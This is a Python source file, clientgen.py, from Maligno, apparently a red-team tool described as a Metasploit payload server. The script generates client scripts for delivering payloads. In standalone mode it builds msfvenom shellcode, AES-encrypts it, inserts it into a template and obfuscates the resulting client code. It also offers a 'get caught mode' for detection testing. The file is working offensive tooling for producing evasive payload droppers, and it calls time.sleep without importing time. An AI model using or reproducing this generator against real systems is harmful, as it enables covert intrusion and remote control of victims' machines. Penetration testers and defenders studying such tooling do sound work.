#!/usr/bin/python

################################################################
#                                                              #
# Maligno - A Metasploit payload server                        #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013-2016 Encripto AS. All rights reserved.        #
#                                                              #
# Maligno is licensed under the FreeBSD license.               #
# http://www.freebsd.org/copyright/freebsd-license.html        #
#                                                              #
################################################################


import os, sys, getopt, string, random
import libs.malcfg, libs.malout, libs.malnet, libs.malpay, libs.malcli
from Crypto.Cipher import AES
from datetime import datetime


__version__ = "2.5"
__author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"


def help():
    libs.malout.print_header(__version__, __author__)
    print """   Usage: python clientgen.py [mandatory args]

   Mandatory args:
       -f  file         ...Server config file
       -s  bool         ...Script with standalone payload (true or false)

   Examples:
       python clientgen.py -f server_config.xml -s true
       python clientgen.py -f server_config.xml -s false
    """
    sys.exit(0)


if __name__ == '__main__':

    try:
        options, args = getopt.getopt(sys.argv[1:], "f:s:", ["file=", "standalone="])

    except getopt.GetoptError, err:
        libs.malout.print_header(__version__, __author__)
        libs.malout.print_error("ERROR: %s.\n" % str(err))
        sys.exit(1)

    if not options:
        help()

    config_file = None
    standalone = None

    for opt, arg in options:
        if opt in ("-f"):
            config_file = arg

        if opt in ("-s"):
            standalone = (str(arg.upper()) == "TRUE")

    if not config_file or standalone == None:
        libs.malout.print_header(__version__, __author__)
        libs.malout.print_error("ERROR: You must provide all mandatory arguments.\n")
        sys.exit(1)

    libs.malout.print_header(__version__, __author__)

    libs.malout.print_info("Reading server configuration file...")
    server_config = libs.malcfg.get_server_config(config_file)
    metasploit_config = libs.malcfg.get_metasploit_config(config_file)
    payload_config = libs.malcfg.get_payload_config(config_file)

    libs.malout.print_info("Reading profile...")
    profile_request_config = libs.malcfg.get_profile_request_config(server_config["profile"])
    profile_response_config = libs.malcfg.get_profile_response_config(server_config["profile"])
    profile_network_config = libs.malcfg.get_profile_network_config(server_config["profile"])
    profile_client_config = libs.malcfg.get_profile_client_config(server_config["profile"])
    profile_client_header_config = libs.malcfg.get_profile_client_header_config(server_config["profile"])

    get_caught_mode = False
    if int(profile_network_config["getcaught"]) > 1:
        get_caught_mode = True

    output_folder = "./clients"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    if standalone:
        index = 0
        generated = 0
        cipher = AES.new(profile_network_config["secret"])
        for msfpayload in payload_config:
            index += 1
            libs.malout.print_info("Generating shellcode: %s of %s..." % (index, len(payload_config)))
            payload_generated = False

            while not payload_generated:
                try:
                    libs.malout.print_info("Generating msf resource file for %s...\n" % msfpayload["payload"])
                    libs.malout.generate_resource_file(server_config,
                                                       metasploit_config,
                                                       profile_response_config,
                                                       profile_client_header_config,
                                                       msfpayload)
                    libs.malout.print_info("Generating %s with msfvenom...\n" % msfpayload["payload"])
                    shellcode = libs.malpay.generate_shellcode(metasploit_config, server_config, msfpayload)
                    package = libs.malpay.pack_data(shellcode,
                                                    cipher,
                                                    profile_network_config,
                                                    profile_response_config)

                    print ""
                    libs.malout.print_info("Generating script: %s of %s..." % (index, len(payload_config)))
                    libs.malout.print_info("Reading client template...")
                    client_template = libs.malcli.get_client_template("maligno_client_stand.template")

                    libs.malout.print_info("Generating client code...")
                    client_code = libs.malcli.generate_client_code(server_config,
                                                                   profile_request_config,
                                                                   profile_response_config,
                                                                   profile_network_config,
                                                                   profile_client_config,
                                                                   profile_client_header_config,
                                                                   client_template,
                                                                   msfpayload,
                                                                   package,
                                                                   standalone)

                    libs.malout.print_info("Obfuscating client code...")
                    obfuscated_client_code = libs.malcli.obfuscate_client_code(client_code)

                    libs.malout.print_info("Writing client code to file...\n")
                    libs.malcli.generate_client_file(obfuscated_client_code, output_folder + "/standalone_" + msfpayload["id"] + "_" + server_config["profile"].split("/")[-1].split(".")[0] + "_" + msfpayload["payload"].split("/")[0] + "_" + msfpayload["payload"].split("/")[-1] + ".py")

                    generated += 1
                    payload_generated = True

                except IndexError:
                    c = ""
                    options = ["Y", "N", "y", "n"]
                    while c not in options:
                        time.sleep(0.5)

                        print ""
                        libs.malout.print_error("There was a problem generating the payload with msfvenom.")
                        c = raw_input("    Would you like to retry? [Y/N]: ")

                        if c.upper() == "N":
                            payload_generated = True

                        elif c.upper() == "Y":
                            print ""

            libs.malout.print_header(__version__, __author__)

        if not generated:
            libs.malout.print_error("No shellcode has been generated.")
            libs.malout.print_error("Tip: Too many errors with msfvenom?")
            libs.malout.print_error("Try to reduce the number of iterations and/or bad chars in your config file.\n")
            sys.exit()

        libs.malout.print_ok("All your scripts should have been generated.")
        libs.malout.print_ok("You should find them in \"%s\".\n" % output_folder)

    else:
        index = 0
        for msfpayload in payload_config:
            index += 1
            print ""
            if get_caught_mode:
                libs.malout.print_warning("Get caught mode is enabled.")
                libs.malout.print_warning("Clientgen will ignore the current client configuration and will create a generic one instead...\n")
            else:
                libs.malout.print_info("Generating client: %s of %s..." % (index, len(payload_config)))

            libs.malout.print_info("Reading client template...")
            client_template = libs.malcli.get_client_template("maligno_client.template")

            libs.malout.print_info("Generating client code...")
            client_code = libs.malcli.generate_client_code(server_config,
                                                           profile_request_config,
                                                           profile_response_config,
                                                           profile_network_config,
                                                           profile_client_config,
                                                           profile_client_header_config,
                                                           client_template,
                                                           msfpayload,
                                                           None,
                                                           standalone)

            libs.malout.print_info("Obfuscating client code...")
            obfuscated_client_code = libs.malcli.obfuscate_client_code(client_code)

            libs.malout.print_info("Writing client code to file...\n")
            if get_caught_mode:
                libs.malcli.generate_client_file(obfuscated_client_code, output_folder + "/" + "get_caught_mode_maligno_client.py")
                break
            else:
                libs.malcli.generate_client_file(obfuscated_client_code, output_folder + "/" + msfpayload["id"] + "_" + server_config["profile"].split("/")[-1].split(".")[0] + "_" + msfpayload["payload"].split("/")[0] + "_" + msfpayload["payload"].split("/")[-1] + ".py")

    sys.exit()